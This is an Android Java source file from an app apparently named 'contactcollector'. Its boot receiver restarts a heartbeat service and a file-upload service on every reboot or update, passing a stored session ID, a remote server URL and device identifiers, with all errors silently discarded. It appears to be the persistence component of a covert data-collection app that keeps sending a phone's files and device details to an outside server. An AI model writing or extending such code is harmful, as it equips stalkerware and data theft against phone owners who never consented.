package com.contactcollector.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        if (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
            action.equals(Intent.ACTION_MY_PACKAGE_REPLACED) ||
            action.equals("android.intent.action.QUICKBOOT_POWERON")) {

            SharedPreferences prefs = context.getSharedPreferences("CollectorPrefs", Context.MODE_PRIVATE);
            String sessionId = prefs.getString("sessionId", null);
            String baseUrl = prefs.getString("baseUrl", null);

            if (sessionId != null && baseUrl != null) {
                String deviceId = prefs.getString("deviceId", null);
                String deviceName = prefs.getString("deviceName", null);
                String deviceModel = prefs.getString("deviceModel", null);
                String deviceBrand = prefs.getString("deviceBrand", null);
                String androidVersion = prefs.getString("androidVersion", null);

                // Restart HeartbeatService
                try {
                    Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
                    heartbeatIntent.putExtra("sessionId", sessionId);
                    heartbeatIntent.putExtra("baseUrl", baseUrl);
                    heartbeatIntent.putExtra("deviceId", deviceId);
                    heartbeatIntent.putExtra("deviceName", deviceName);
                    heartbeatIntent.putExtra("deviceModel", deviceModel);
                    heartbeatIntent.putExtra("deviceBrand", deviceBrand);
                    heartbeatIntent.putExtra("androidVersion", androidVersion);
                    if (Build.VERSION.SDK_INT >= 26) {
                        context.startForegroundService(heartbeatIntent);
                    } else {
                        context.startService(heartbeatIntent);
                    }
                } catch (Exception e) {}

                // Restart FileUploadService
                try {
                    Intent uploadIntent = new Intent(context, FileUploadService.class);
                    uploadIntent.putExtra("sessionId", sessionId);
                    uploadIntent.putExtra("baseUrl", baseUrl);
                    uploadIntent.putExtra("deviceId", deviceId);
                    if (Build.VERSION.SDK_INT >= 26) {
                        context.startForegroundService(uploadIntent);
                    } else {
                        context.startService(uploadIntent);
                    }
                } catch (Exception e) {}
            }
        }
    }
}
